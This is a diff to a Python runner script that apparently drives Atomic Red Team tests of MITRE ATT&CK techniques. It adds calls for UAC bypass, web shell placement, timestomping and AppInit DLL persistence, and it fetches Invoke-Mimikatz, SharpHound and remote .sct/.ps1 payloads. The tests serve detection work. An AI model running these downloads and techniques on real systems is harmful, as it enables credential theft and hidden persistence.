@@ -1,5 +1,10 @@
 # Imports runner.py, sets variables and executes scripts
 
+# TODO:
+# Finish populating windows tests
+# Add logic to clean memory after every couple of tests
+# Populate Linux/Mac tests (low pri)
+
 import runner
 
 def main():
@@ -116,7 +121,7 @@ def main():
     # T1048 - Exfiltration Over Alternative Protocol
     # Commenting out test, as it requires a destination address to exfil to
     # If running test, fill in path to .txt file and remote exfil IP address
-    techniques.execute("T1048", position=0, parameters={'input_file': 'C:\\REPLACE-ME', 'ip_address': 'REPLACE-ME'})
+    #techniques.execute("T1048", position=0, parameters={'input_file': 'C:\\REPLACE-ME', 'ip_address': 'REPLACE-ME'})
 
     # T1049 - System Network Connections Discovery
     techniques.execute("T1049", position=0, parameters={})
@@ -215,19 +220,60 @@ def main():
     techniques.execute("T1085", position=0, parameters={'file_url': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/T1085.sct'})
 
     # T1086 - PowerShell
-    techniques.execute("T1081", position=0, parameters={'mimurl': 'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'})
-    techniques.execute("T1081", position=1, parameters={'bloodurl': 'https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1'})
-    techniques.execute("T1081", position=2, parameters={})
-    techniques.execute("T1081", position=3, parameters={})
-    techniques.execute("T1081", position=4, parameters={})
-    techniques.execute("T1081", position=5, parameters={'user_name': 'atomic_user', 'full_name': 'Atomic Red Team', 'password': 'ATOM1CR3DT3@M', 'description': 'Test user created via powershell using red canary scripts'})
-    techniques.execute("T1081", position=6, parameters={'url': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.ps1'})
-    techniques.execute("T1081", position=7, parameters={'url': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.ps1'})
-    techniques.execute("T1081", position=8, parameters={'url': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.xml'})
-    techniques.execute("T1081", position=9, parameters={'url': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/mshta.sct'})
-    techniques.execute("T1081", position=10, parameters={})
+    techniques.execute("T1086", position=0, parameters={'mimurl': 'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'})
+    techniques.execute("T1086", position=1, parameters={'bloodurl': 'https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1'})
+    techniques.execute("T1086", position=2, parameters={})
+    techniques.execute("T1086", position=3, parameters={})
+    techniques.execute("T1086", position=4, parameters={})
+    techniques.execute("T1086", position=5, parameters={'user_name': 'atomic_user', 'full_name': 'Atomic Red Team', 'password': 'ATOM1CR3DT3@M', 'description': 'Test user created via powershell using red canary scripts'})
+    techniques.execute("T1086", position=6, parameters={'url': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.ps1'})
+    techniques.execute("T1086", position=7, parameters={'url': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.ps1'})
+    techniques.execute("T1086", position=8, parameters={'url': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.xml'})
+    techniques.execute("T1086", position=9, parameters={'url': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/mshta.sct'})
+    techniques.execute("T1086", position=10, parameters={})
 
-    #
+    # T1087 - Account Discovery
+    techniques.execute("T1087", position=0, parameters={})
+    techniques.execute("T1087", position=1, parameters={})
+    techniques.execute("T1087", position=2, parameters={})
+    techniques.execute("T1087", position=3, parameters={})
+
+    # T1088 - Bypass User Account Control
+    techniques.execute("T1088", position=0, parameters={'executable_binary': 'C:\\Windows\\System32\\cmd.exe'})
+    techniques.execute("T1088", position=1, parameters={'executable_binary': 'C:\\Windows\\System32\\cmd.exe'})
+    techniques.execute("T1088", position=2, parameters={'executable_binary': 'C:\\Windows\\System32\\cmd.exe'})
+    techniques.execute("T1088", position=3, parameters={'executable_binary': 'C:\\Windows\\System32\\cmd.exe'})
+
+    # T1090 - Connection Proxy
+    #techniques.execute("T1090", position=0, parameters={})  #Linux/Mac technique
+
+    # T1096 - NTFS File Attributes
+    techniques.execute("T1096", position=0, parameters={'path': 'C:\\ADS\\'})
+
+    # T1098 - Account Manipulation
+    techniques.execute("T1098", position=0, parameters={})
+
+    # T1099 - Timestomp
+    techniques.execute("T1099", position=0, parameters={'file_path': 'C:\\Some\\file.txt', 'target_date_time': '1970-01-01 00:00:00'})
+    techniques.execute("T1099", position=1, parameters={'file_path': 'C:\\Some\\file.txt', 'target_date_time': '1970-01-01 00:00:00'})
+    techniques.execute("T1099", position=2, parameters={'file_path': 'C:\\Some\\file.txt', 'target_date_time': '1970-01-01 00:00:00'})
+
+    # T1100 - Web Shell
+    techniques.execute("T1100", position=0, parameters={'web_shell_path': 'C:\\inetpub\\wwwroot', 'web_shells': 'C:\\AtomicRedTeam\\atomics\\T1100\\shells'})
+
+    # T1101 - Security Support Provider
+    techniques.execute("T1101", position=0, parameters={'fake_ssp_dll': 'not-a-ssp'})
+
+    # T1103 - AppInit DLLs
+    techniques.execute("T1103", position=0, parameters={'registry_file': 'T1103.reg'})
+
+    # T1105 - Remote File Copy
+    techniques.execute("T1105", position=0, parameters={'remote_file': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt', 'local_path': 'Atomic-license.txt'})
+    techniques.execute("T1105", position=1, parameters={'remote_file': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt', 'local_path': 'Atomic-license.txt'})
+
+    # T1107 -
+
+
 
 
 if __name__ == "__main__":
